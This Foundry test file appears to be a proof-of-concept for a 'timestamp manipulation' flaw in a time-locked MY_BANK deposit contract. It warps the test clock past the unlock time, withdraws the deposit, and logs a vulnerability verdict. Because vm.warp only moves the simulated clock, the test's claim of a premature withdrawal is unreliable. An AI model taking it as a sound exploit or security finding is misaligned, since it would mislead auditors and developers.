// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol";

contract MY_BANKTest is Test {
    Log public logContract;
    MY_BANK public myBank;
    address public user = makeAddr("user");

    function setUp() public {
        // Deploy Log contract
        logContract = new Log();
        
        // Deploy MY_BANK with Log address
        myBank = new MY_BANK(address(logContract));
        
        // Fund user for deposit
        vm.deal(user, 1 ether);
    }

    function test_TimestampManipulation() public {
        // Simulate deposit by user
        uint depositAmount = 1 ether;
        uint unlockTime = block.timestamp + 100 days;
        vm.prank(user);
        myBank.Put{value: depositAmount}(unlockTime);
        
        // Confirm funds are deposited
        assertEq(address(myBank).balance, depositAmount, "deposit failed");

        // Only 50 days pass in real-time
        vm.warp(block.timestamp + 50 days);
        
        // Verify lock period not completed
        assertLt(block.timestamp, unlockTime, "should not reach unlock time yet");
        
        // Manipulate timestamp to unlockTime + 1 day
        uint manipulatedTimestamp = unlockTime + 1 days;
        vm.warp(manipulatedTimestamp);

        // Confirm timestamp manipulation
        assertGt(block.timestamp, unlockTime, "failed to manipulate timestamp");

        // Capture initial states before Collect
        console.log("--- BEFORE-Trigger Collect ---");
        uint contractBalanceBefore = address(myBank).balance;
        uint userEthBalanceBefore = user.balance;
        (uint256 userAccBalanceBefore, ) = myBank.Acc(user);
        console.log("Contract ETH Balance (before):", contractBalanceBefore);
        console.log("User ETH Balance (before):", userEthBalanceBefore);
        console.log("User Account Balance (before):", userAccBalanceBefore);

        console.log("--- Trigger Collect ---");
        vm.prank(user);
        myBank.Collect(depositAmount);

        // Capture states after Collect
        console.log("--- AFTER-Trigger Collect ---");
        uint contractBalanceAfter = address(myBank).balance;
        uint userEthBalanceAfter = user.balance;
        (uint256 userAccBalanceAfter, ) = myBank.Acc(user);
        console.log("Contract ETH Balance (after):", contractBalanceAfter);
        console.log("User ETH Balance (after):", userEthBalanceAfter);
        console.log("User Account Balance (after):", userAccBalanceAfter);

        // Original test assertions
        assertEq(contractBalanceAfter, 0, "funds not withdrawn");
        assertEq(userEthBalanceAfter, userEthBalanceBefore + depositAmount, "user didn't receive funds");

        // Vulnerability detection - verify state changes
        bool contractBalanceCleared = contractBalanceAfter == 0;
        bool userBalanceIncreased = userEthBalanceAfter == userEthBalanceBefore + depositAmount;
        bool userAccountCleared = userAccBalanceAfter == 0;

        bool exploitationSuccess = contractBalanceCleared && userBalanceIncreased && userAccountCleared;

        // Final verdict based on state changes
        if (exploitationSuccess) {
            console.log("Vulnerability Exists: Timestamp manipulation allowed premature withdrawal");
        } else {
            console.log("Vulnerability not Exist: State changes not indicate successful exploitation");
        }
    }
}